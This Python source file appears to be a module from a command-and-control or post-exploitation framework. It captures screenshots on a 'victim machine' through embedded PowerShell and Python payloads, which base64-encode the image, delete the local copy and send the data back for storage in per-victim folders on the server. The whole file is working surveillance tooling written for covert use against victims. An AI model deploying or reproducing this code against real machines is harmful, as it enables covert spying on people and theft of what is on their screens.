import sys
import os
import pdb
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Screenshot(Module):
	description = 'This module takes a screenshot on the victim machine using the python mss module.'

	@classmethod
	def module_options(cls):
		h = {
			'path' : 'Directory to download the screenshot on the server. Default is shared/victim_data/<victim_id>' 
		}
		return h

	def __init__(self,name,utility,language,options):

		## We are loading the script in the script variable here
		super(Screenshot, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id,task_id):

		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.png"
		ss_path = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
			else:
				ss_path = os.path.join(options['path'],filename)

		## Screenshot is base64 encoded
		b64encoded_string = data
		decoded_string = base64.b64decode(b64encoded_string)


		## Dump the screenshot
		with open(ss_path, "wb") as f:
			f.write(decoded_string)
		f.close()

		output = ss_path
		return output


	def script_powershell(self,options):
		return """[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | out-null
        function screenshot([Drawing.Rectangle]$bounds) {

           ## Instead of saving
           $ms = New-Object System.IO.MemoryStream;
           
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)


           $graphics.Dispose()
           $bmp.save($ms, [Drawing.Imaging.ImageFormat]::Png);
           $bmp.Dispose()

           [convert]::ToBase64String($ms.ToArray());

        }

        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        $bytes = screenshot $bounds

        return $bytes"""

	def script_python(self,options):
		return """def execute_command():
        from mss import mss
        import os
        import base64
        ## Take screenshot
        with mss() as sct:
            filename = sct.shot()

        image_path = os.path.join(os.getcwd(),filename)
        if os.path.isfile(image_path):
            content = open(image_path,"rb").read()
            enc_content = base64.b64encode(content)
            os.remove(image_path)
            return enc_content
        else:
            return False"""

